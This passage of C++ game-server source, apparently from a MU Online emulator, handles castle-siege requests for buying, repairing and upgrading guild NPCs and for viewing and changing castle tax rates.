		if( (gObj[iIndex].pInventory[lpMsgResult->iItemPos].m_Durability - 1.0) > 0.0)
		{
			gObj[iIndex].pInventory[lpMsgResult->iItemPos].m_Durability -= 1.0;
			::GCItemDurSend(iIndex, lpMsgResult->iItemPos, gObj[iIndex].pInventory[lpMsgResult->iItemPos].m_Durability, 0);
		}else
		{
			gObjInventoryDeleteItem(iIndex, lpMsgResult->iItemPos);
			GCInventoryItemDeleteSend(iIndex, lpMsgResult->iItemPos, 1);
		}
		
		pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x04, sizeof(pMsgResult));
		pMsgResult.btResult = iResult;
		pMsgResult.btGuildMark1 = SET_NUMBERH(SET_NUMBERHW(lpMsgResult->iRegMarkCount));
		pMsgResult.btGuildMark2 = SET_NUMBERL(SET_NUMBERHW(lpMsgResult->iRegMarkCount));
		pMsgResult.btGuildMark3 = SET_NUMBERH(SET_NUMBERLW(lpMsgResult->iRegMarkCount));
		pMsgResult.btGuildMark4 = SET_NUMBERL(SET_NUMBERLW(lpMsgResult->iRegMarkCount));
		memcpy(&pMsgResult.szGuildName, lpMsgResult->szGuildName, sizeof(pMsgResult.szGuildName));
		DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
		gObj[iIndex].UseEventServer = false;
	}
#endif
}




void CGReqNpcBuy(PMSG_REQ_NPCBUY * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if( lpMsg == NULL )
		return;

	if( ::gObjIsConnected(iIndex) == FALSE )
		return;

	if( g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE )
	{
		LogAddC(2, "[CastleSiege] CGReqNpcBuy() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
	}
	else if ( (gObj[iIndex].GuildStatus != G_MASTER) && (gObj[iIndex].GuildStatus != G_SUB_MASTER) )
	{
		LogAddC(2, "[CastleSiege] CGReqNpcBuy() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
	}
	else
	{
		BYTE btResult = 0;

		BOOL bRETVAL = g_CastleSiege.CheckAddDbNPC(iIndex, lpMsg->iNpcNumber, lpMsg->iNpcIndex, btResult);

		if( bRETVAL == FALSE )
		{
			GCAnsNpcBuy(iIndex, btResult, lpMsg->iNpcNumber, lpMsg->iNpcIndex);
			LogAddC(2, "[CastleSiege] CGReqNpcBuy() ERROR - CCastleSiege::CheckAddDbNPC() [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
				gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus,
				lpMsg->iNpcNumber, lpMsg->iNpcIndex);
		}
		else
		{
			LogAddC(2, "[CastleSiege] CGReqNpcBuy() OK - [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
				gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus,
				lpMsg->iNpcNumber, lpMsg->iNpcIndex);
		}
	}
#endif
}

struct PMSG_ANS_NPCBUY { // <size 0x10>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ BYTE btResult;
  /*<thisrel this+0x8>*/ /*|0x4|*/ int iNpcNumber;
  /*<thisrel this+0x8>*/ /*|0x4|*/ int iNpcIndex;
};

void GCAnsNpcBuy(int iIndex, int iResult, int iNpcNumber, int iNpcIndex)
{
#if (GS_CASTLE==1)
	PMSG_ANS_NPCBUY pMsgResult;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x05, sizeof(pMsgResult));
	pMsgResult.btResult = (BYTE)iResult;
	pMsgResult.iNpcNumber = iNpcNumber;
	pMsgResult.iNpcIndex = iNpcIndex;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}



void CGReqNpcRepair(PMSG_REQ_NPCREPAIR * lpMsg, int iIndex)
{
	#if (GS_CASTLE==1)
	//DebugLog("%s START",__FUNCTION__);
	if( lpMsg == NULL )
		return;

	if( ::gObjIsConnected(iIndex) == FALSE )
		return;

	if( g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE )
	{
		LogAddC(2, "[CastleSiege] CGReqNpcRepair() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
	}
	else if ( (gObj[iIndex].GuildStatus != G_MASTER) && (gObj[iIndex].GuildStatus != G_SUB_MASTER) )
	{
		LogAddC(2, "[CastleSiege] CGReqNpcRepair() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
	}
	else
	{
		_CS_NPC_DATA pNpcData;

		BOOL bRETVAL = g_CastleSiege.GetNpcData(lpMsg->iNpcNumber, lpMsg->iNpcIndex, pNpcData);

		if( bRETVAL == FALSE )
		{
			GCAnsNpcRepair(iIndex, 0, lpMsg->iNpcNumber, lpMsg->iNpcIndex, 0, 0);
			LogAddC(2, "[CastleSiege] CGReqNpcRepair() ERROR - CL Request Fail [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
				gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, lpMsg->iNpcNumber, lpMsg->iNpcIndex);
		}
		else
		{
			int iNpcIndex = lpMsg->iNpcIndex;

			if( gObjIsConnected(pNpcData.m_iNPC_OBJINDEX) == FALSE )
			{
				GCAnsNpcRepair(iIndex, 0, lpMsg->iNpcNumber, lpMsg->iNpcIndex, 0, 0);
				LogAddTD("[CastleSiege] CGReqNpcRepair() ERROR - Npc Alive Data Mismatch [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
					gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, lpMsg->iNpcNumber, lpMsg->iNpcIndex);
			}
			else if( gObj[pNpcData.m_iNPC_OBJINDEX].Live == 0 )
			{
				GCAnsNpcRepair(iIndex, 0, lpMsg->iNpcNumber, lpMsg->iNpcIndex, 0, 0);
				LogAddC(2, "[CastleSiege] CGReqNpcRepair() ERROR - Npc Alive Data Mismatch [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
					gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, lpMsg->iNpcNumber, lpMsg->iNpcIndex);	
			}
			else
			{
				if( gObj[pNpcData.m_iNPC_OBJINDEX].Life >= gObj[pNpcData.m_iNPC_OBJINDEX].MaxLife )
				{
					gObj[pNpcData.m_iNPC_OBJINDEX].Life = (float)pNpcData.m_iNPC_HP;
					gObj[pNpcData.m_iNPC_OBJINDEX].MaxLife = (float)pNpcData.m_iNPC_MAXHP;
					GCAnsNpcRepair(iIndex, 0, lpMsg->iNpcNumber, lpMsg->iNpcIndex, 0, 0);
					LogAddC(2, "[CastleSiege] CGReqNpcRepair() ERROR - Max NPC Health Npc:(CLS:%d, IDX:%d, LIFE:%d, MAXHP:%d)",
						lpMsg->iNpcNumber, lpMsg->iNpcIndex, pNpcData.m_iNPC_HP, pNpcData.m_iNPC_MAXHP);	
				}
				else
				{
					int iRepairCost = 0;

					switch( lpMsg->iNpcNumber )
					{
						case 277:
							iRepairCost	= ( gObj[pNpcData.m_iNPC_OBJINDEX].MaxLife - gObj[pNpcData.m_iNPC_OBJINDEX].Life) * 0.5 + ( gObj[pNpcData.m_iNPC_OBJINDEX].m_btCsNpcDfLevel * 1000000 );
						break;
						case 283:
							iRepairCost	= ( gObj[pNpcData.m_iNPC_OBJINDEX].MaxLife - gObj[pNpcData.m_iNPC_OBJINDEX].Life) * 0.3 + ( gObj[pNpcData.m_iNPC_OBJINDEX].m_btCsNpcDfLevel + gObj[pNpcData.m_iNPC_OBJINDEX].m_btCsNpcRgLevel) * 1000000;
						break;
						default:
							GCAnsNpcRepair(iIndex, 0, lpMsg->iNpcNumber, lpMsg->iNpcIndex, 0, 0);
						break;
					}

					if( gObj[iIndex].Money < iRepairCost )
					{
						GCAnsNpcRepair(iIndex, 3, lpMsg->iNpcNumber, lpMsg->iNpcIndex, 0, 0);
						LogAddC(2, "[CastleSiege] CGReqNpcRepair() ERROR - Money isn't enough [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
							gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, lpMsg->iNpcNumber, lpMsg->iNpcIndex);
					}
					else
					{
						LogAddTD("[CastleSiege] CGReqNpcRepair() OK - [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
							gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, lpMsg->iNpcNumber, lpMsg->iNpcIndex);		
						GS_GDReqCastleNpcRepair(g_MapServerManager.GetMapSvrGroup(), iIndex, lpMsg->iNpcNumber, lpMsg->iNpcIndex, iRepairCost);
					}
				}
			}
		}
	}	
	//DebugLog("%s END",__FUNCTION__);
#endif
}

struct PMSG_ANS_NPCREPAIR { // <size 0x18>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x8>*/ /*|0x4|*/ int iNpcNumber;
  /*<thisrel this+0xc>*/ /*|0x4|*/ int iNpcIndex;
  /*<thisrel this+0x10>*/ /*|0x4|*/ int iNpcHP;
  /*<thisrel this+0x14>*/ /*|0x4|*/ int iNpcMaxHP;
};

void GCAnsNpcRepair(int iIndex, int iResult, int iNpcNumber, int iNpcIndex, int iNpcHP, int iNpcMaxHP)
{
#if (GS_CASTLE==1)
	PMSG_ANS_NPCREPAIR pMsgResult;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x06, sizeof(pMsgResult));
	pMsgResult.btResult = iResult;
	pMsgResult.iNpcNumber = iNpcNumber;
	pMsgResult.iNpcIndex = iNpcIndex;
	pMsgResult.iNpcHP = iNpcHP;
	pMsgResult.iNpcMaxHP = iNpcMaxHP;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}

//----- (0045C580) --------------------------------------------------------
void CGReqNpcUpgrade(PMSG_REQ_NPCUPGRADE * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if( lpMsg == NULL )
		return;

	if( ::gObjIsConnected(iIndex) == FALSE )
		return;

	if( strcmp(gObj[iIndex].GuildName, "") == 0 )
		return;


	if( g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE )
	{
		LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
		return;
	}

	if ( (gObj[iIndex].GuildStatus != G_MASTER) && (gObj[iIndex].GuildStatus != G_SUB_MASTER) )
	{
		LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
		return;
	}

	int iNEED_GEMOFDEFEND = 0, 
		iNEED_MONEY = 0, 
		iCUR_UPLVL = 0, 
		iNXT_UPLVL = 0, 
		iNXT_UPVALUE = 0; 

	BOOL bENABLE_UPGRADE = FALSE;

	switch( lpMsg->iNpcNumber )
	{
		case 277:
		{
			_CS_NPC_DATA m_NpcData;
			BOOL bResult = g_CastleSiege.GetNpcData(lpMsg->iNpcNumber, lpMsg->iNpcIndex, m_NpcData);

			if( bResult )
			{
				switch( lpMsg->iNpcUpType )
				{
					case 1:
					{
						iCUR_UPLVL = m_NpcData.m_iNPC_DF_LEVEL;
						iNXT_UPLVL = lpMsg->iNpcUpValue;

						if( (iNXT_UPLVL >= 1) && (iNXT_UPLVL <= 3) && ((iCUR_UPLVL+1) == iNXT_UPLVL) )
						{
							bENABLE_UPGRADE = TRUE;
							iNXT_UPVALUE = iNXT_UPLVL;
							iNEED_GEMOFDEFEND = g_iNpcUpDfLevel_CGATE[iNXT_UPLVL-1][1];
							iNEED_MONEY = g_iNpcUpDfLevel_CGATE[iNXT_UPLVL-1][2];
						}
					}
					break;

					case 3:
					{
						iCUR_UPLVL = 0;
						for( int i = 0; i < 3; i++ )
						{
							if( m_NpcData.m_iNPC_MAXHP >= g_iNpcUpMaxHP_CGATE[i][0] )
								iCUR_UPLVL = (i+1);
						}

						iNXT_UPLVL = 0;
						
						for(int i=0; i < 3;i++)
						{
							if( lpMsg->iNpcUpValue == g_iNpcUpValue_CGATE[i][0] && m_NpcData.m_iNPC_MAXHP == g_iNpcUpValue_CGATE[i][1])
							{
								iNXT_UPLVL = (i+1);
							}
						}

						if( (iNXT_UPLVL >= 1) && (iNXT_UPLVL <= 3) && (iNXT_UPLVL == (iCUR_UPLVL+1)) )
						{
							bENABLE_UPGRADE = TRUE;
							iNXT_UPVALUE = g_iNpcUpMaxHP_CGATE[iNXT_UPLVL-1][0];
							iNEED_GEMOFDEFEND = g_iNpcUpMaxHP_CGATE[iNXT_UPLVL-1][1];
							iNEED_MONEY = g_iNpcUpMaxHP_CGATE[iNXT_UPLVL-1][2];
						}
					}
					break;

					default:
					{
						GCAnsNpcUpgrade(iIndex, 5, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
						LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - UpType doesn't Exist [%s][%s], Guild:(%s)(%d), NPC CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d",
							gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
						return;
					}break;
				}
			} else {
				GCAnsNpcUpgrade(iIndex, 7, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
				LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - UpType doesn't Exist [%s][%s], Guild:(%s)(%d), NPC CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d",
					gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
				return;
			}
		}
		break;

		case 283:
		{
			_CS_NPC_DATA m_NpcData;
			BOOL bResult = g_CastleSiege.GetNpcData(lpMsg->iNpcNumber, lpMsg->iNpcIndex, m_NpcData);

			if( bResult )
			{
				switch( lpMsg->iNpcUpType )
				{
					case 1:
					{
						iCUR_UPLVL = m_NpcData.m_iNPC_DF_LEVEL;
						iNXT_UPLVL = lpMsg->iNpcUpValue;

						if( (iNXT_UPLVL >= 1) && (iNXT_UPLVL <= 3) && ((iCUR_UPLVL+1) == iNXT_UPLVL) )
						{
							bENABLE_UPGRADE = TRUE;
							iNXT_UPVALUE = g_iNpcUpDfLevel_CSTATUE[iNXT_UPLVL-1][0];
							iNEED_GEMOFDEFEND = g_iNpcUpDfLevel_CSTATUE[iNXT_UPLVL-1][1];
							iNEED_MONEY = g_iNpcUpDfLevel_CSTATUE[iNXT_UPLVL-1][2];
						}
					}
					break;

					case 2:
					{
						iCUR_UPLVL = m_NpcData.m_iNPC_RG_LEVEL;
						iNXT_UPLVL = lpMsg->iNpcUpValue;						

						if( (iNXT_UPLVL >= 1) && (iNXT_UPLVL <= 3) && (iNXT_UPLVL == (iCUR_UPLVL+1)) )
						{
							bENABLE_UPGRADE = TRUE;
							iNXT_UPVALUE = g_iNpcUpRgLevel_CSTATUE[iNXT_UPLVL-1][0];
							iNEED_GEMOFDEFEND = g_iNpcUpRgLevel_CSTATUE[iNXT_UPLVL-1][1];
							iNEED_MONEY = g_iNpcUpRgLevel_CSTATUE[iNXT_UPLVL-1][2];
						}
					}
					break;

					//Statue HP
					case 3:
					{
						iCUR_UPLVL = 0;
						for( int i = 0; i < 3; i++ )
						{
							if( m_NpcData.m_iNPC_MAXHP >= g_iNpcUpMaxHP_CSTATUE[i][0] )
								iCUR_UPLVL = (i+1);
						}

						iNXT_UPLVL = 0;
						for(int i=0; i < 3;i++)
						{
							if( lpMsg->iNpcUpValue == g_iNpcUpValue_CSTATUE[i][0] && m_NpcData.m_iNPC_MAXHP == g_iNpcUpValue_CSTATUE[i][1])
							{
								iNXT_UPLVL = (i+1);
							}
						}

						if( (iNXT_UPLVL >= 1) && (iNXT_UPLVL <= 3) && (iNXT_UPLVL == (iCUR_UPLVL+1)) )
						{
							bENABLE_UPGRADE = TRUE;
							iNXT_UPVALUE = g_iNpcUpMaxHP_CSTATUE[iNXT_UPLVL-1][0];
							iNEED_GEMOFDEFEND = g_iNpcUpMaxHP_CSTATUE[iNXT_UPLVL-1][1];
							iNEED_MONEY = g_iNpcUpMaxHP_CSTATUE[iNXT_UPLVL-1][2];
						}
					}
					break;

					default:
					{
						LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - UpType doesn't Exist [%s][%s], Guild:(%s)(%d), NPC CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d, NXTLV:%d",
							gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, 
							lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue, iNXT_UPLVL);

						GCAnsNpcUpgrade(iIndex, 5, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
						return;
					}break;
				}
			} else {
				GCAnsNpcUpgrade(iIndex, 7, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
				LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - UpType doesn't Exist [%s][%s], Guild:(%s)(%d), NPC CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d, NXTLV:%d",
					gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, 
					lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue, iNXT_UPLVL);
				return;
			}
		}
		break;
	}

	if ( bENABLE_UPGRADE )
	{
		if ( gObj[iIndex].Money < iNEED_MONEY )
		{
			GCAnsNpcUpgrade(iIndex, 3, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
			LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - Money is Low [%s][%s], Guild:(%s)(%d), NPC CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d, NXTLV:%d, Money:%d, Need Money:%d",
				gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, 
				lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue, iNXT_UPLVL,
				gObj[iIndex].Money, iNEED_MONEY);
			return;
		}

		int NumberJewelsFound = gObjGetItemCountInIventory(iIndex, ITEMGET(14,31));
		if ( NumberJewelsFound < iNEED_GEMOFDEFEND )
		{
			GCAnsNpcUpgrade(iIndex, 4, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
			LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - Gem is Low [%s][%s], Guild:(%s)(%d), NPC CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d, NXTLV:%d, Gem:%d, Need Gem:%d",
				gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, 
				lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue, iNXT_UPLVL,
				NumberJewelsFound, iNEED_GEMOFDEFEND);
			return;
		}

		gObj[iIndex].bIsChaosMixCompleted = true;
		//gObj[iIndex].m_bIsCastleNPCUpgradeCompleted = true;

		GS_GDReqCastleNpcUpgrade(g_MapServerManager.GetMapSvrGroup(), iIndex, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, iNXT_UPVALUE, iNXT_UPLVL - 1);
		LogAddTD("[CastleSiege] CGReqNpcUpgrade() REQ OK - [%s][%s], Guild:(%s)(%d), NPC CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d, NXTLV:%d",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, 
			lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue, iNXT_UPLVL);
	}
	else
	{
		LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - Wrong Type [%s][%s], Guild:(%s)(%d), NPC CLS:%d, IDX:%d, UPTYPE:%d, UPVAL:%d, NXTLV:%d, CURLVL:%d, Money:%d, Need Money:%d",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, 
			lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue, iNXT_UPLVL, iCUR_UPLVL,
			gObj[iIndex].Money, iNEED_MONEY);

		GCAnsNpcUpgrade(iIndex, 6, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
	}
#endif
}

struct PMSG_ANS_NPCUPGRADE { // <size 0x18>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x8>*/ /*|0x4|*/ int iNpcNumber;
  /*<thisrel this+0xc>*/ /*|0x4|*/ int iNpcIndex;
  /*<thisrel this+0x10>*/ /*|0x4|*/ int iNpcUpType;
  /*<thisrel this+0x14>*/ /*|0x4|*/ int iNpcUpValue;
};

void GCAnsNpcUpgrade(int iIndex, int iResult, int iNpcNumber, int iNpcIndex, int iNpcUpType, int iNpcUpValue)
{
#if (GS_CASTLE==1)
	PMSG_ANS_NPCUPGRADE pMsgResult;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x07, sizeof(pMsgResult));
	pMsgResult.btResult = iResult;
	pMsgResult.iNpcNumber = iNpcNumber;
	pMsgResult.iNpcIndex = iNpcIndex;
	pMsgResult.iNpcUpType = iNpcUpType;
	pMsgResult.iNpcUpValue = iNpcUpValue;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}




void CGReqTaxMoneyInfo(PMSG_REQ_TAXMONEYINFO * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if(OBJMAX_RANGE(iIndex) == 0)
	{
		return;
	}

	if( lpMsg == NULL )
		return;

	if( strcmp(gObj[iIndex].GuildName, "") == 0 )
		return;
	
	if( g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE )
	{
		LogAddTD("[CastleSiege] CGReqTaxMoneyInfo() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
	}
	else if ( (gObj[iIndex].GuildStatus != G_MASTER) && (gObj[iIndex].GuildStatus != G_SUB_MASTER) )
	{
		LogAddTD("[CastleSiege] CGReqTaxMoneyInfo() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
	}
	else
	{
		GS_GDReqTaxInfo(g_MapServerManager.GetMapSvrGroup(), iIndex);
		LogAddTD("[CastleSiege] CGReqTaxMoneyInfo() REQ OK - [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
	}
#endif
}

struct PMSG_ANS_TAXMONEYINFO { // <size 0xf>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x5>*/ /*|0x1|*/ unsigned char btTaxRateChaos;
  /*<thisrel this+0x6>*/ /*|0x1|*/ unsigned char btTaxRateStore;
  /*<thisrel this+0x7>*/ /*|0x1|*/ unsigned char btReserve1;
  /*<thisrel this+0x8>*/ /*|0x1|*/ unsigned char btReserve2;
  /*<thisrel this+0x9>*/ /*|0x1|*/ unsigned char btReserve3;
  /*<thisrel this+0xa>*/ /*|0x1|*/ unsigned char btReserve4;
  /*<thisrel this+0xb>*/ /*|0x1|*/ unsigned char btMoney1;
  /*<thisrel this+0xc>*/ /*|0x1|*/ unsigned char btMoney2;
  /*<thisrel this+0xd>*/ /*|0x1|*/ unsigned char btMoney3;
  /*<thisrel this+0xe>*/ /*|0x1|*/ unsigned char btMoney4;
};

void GCAnsTaxMoneyInfo(int iIndex, int iResult, BYTE btTaxRateChaos, BYTE btTaxRateStore, __int64 i64Money)
{
#if (GS_CASTLE==1)
	PMSG_ANS_TAXMONEYINFO pMsgResult;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x08, sizeof(pMsgResult));
	pMsgResult.btResult = iResult;
	pMsgResult.btTaxRateChaos = btTaxRateChaos;
	pMsgResult.btTaxRateStore = btTaxRateStore;

	/*pMsgResult.btMoney1 = SET_NUMBERH( SET_NUMBERHW(SET_NUMBERHDW(i64Money)) );
	pMsgResult.btMoney2 = SET_NUMBERL( SET_NUMBERHW(SET_NUMBERHDW(i64Money)) );
	pMsgResult.btMoney3 = SET_NUMBERH( SET_NUMBERLW(SET_NUMBERHDW(i64Money)) );
	pMsgResult.btMoney4 = SET_NUMBERL( SET_NUMBERLW(SET_NUMBERHDW(i64Money)) );
	pMsgResult.btMoney5 = SET_NUMBERH( SET_NUMBERHW(SET_NUMBERLDW(i64Money)) );
	pMsgResult.btMoney6 = SET_NUMBERL( SET_NUMBERHW(SET_NUMBERLDW(i64Money)) );
	pMsgResult.btMoney7 = SET_NUMBERH( SET_NUMBERLW(SET_NUMBERLDW(i64Money)) );
	pMsgResult.btMoney8 = SET_NUMBERL( SET_NUMBERLW(SET_NUMBERLDW(i64Money)) );*/

	pMsgResult.btMoney1 = SET_NUMBERH(SET_NUMBERHW(i64Money));
	pMsgResult.btMoney2 = SET_NUMBERL(SET_NUMBERHW(i64Money));
	pMsgResult.btMoney3 = SET_NUMBERH(SET_NUMBERLW(i64Money));
	pMsgResult.btMoney4 = SET_NUMBERL(SET_NUMBERLW(i64Money));

	pMsgResult.btReserve1 = 0x00;
	pMsgResult.btReserve2 = 0x00;
	pMsgResult.btReserve3 = 0x00;
	pMsgResult.btReserve4 = 0x00;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}




void CGReqTaxRateChange(PMSG_REQ_TAXRATECHANGE * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if(OBJMAX_RANGE(iIndex) == 0)
	{
		return;
	}

	if( lpMsg == NULL )
		return;

	if( strcmp(gObj[iIndex].GuildName, "") == 0 )
		return;

	if( g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE )
	{
		LogAddTD("[CastleSiege] CGReqTaxRateChange() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
	}
	else if ( (gObj[iIndex].GuildStatus != G_MASTER) && (gObj[iIndex].GuildStatus != G_SUB_MASTER) )
	{
		LogAddTD("[CastleSiege] CGReqTaxRateChange() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
	}
	else
	{
		int iMaxTaxRate = 0;

		switch( lpMsg->btTaxType )
		{
		case 1:
			iMaxTaxRate = 3;
			break;
		case 2:
			iMaxTaxRate = 3;
			break;
		case 3:
			iMaxTaxRate = 300000;
			break;
		}

		int iTaxRate = MAKE_NUMBERDW(MAKE_NUMBERW(lpMsg->btTaxRate1, lpMsg->btTaxRate2), MAKE_NUMBERW(lpMsg->btTaxRate3, lpMsg->btTaxRate4)); 

		if( (iTaxRate < 0) || (iTaxRate > iMaxTaxRate) )
		{
			LogAddTD("[CastleSiege] CGReqTaxRateChange() ERROR - Tax Rate Out of Range [%s][%s], Guild:(%s)(%d), TaxType:%d, TaxRate:%d",
				gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, lpMsg->btTaxType, iTaxRate);
		}
		else
		{
			GS_GDReqTaxRateChange(g_MapServerManager.GetMapSvrGroup(), iIndex, lpMsg->btTaxType, iTaxRate);

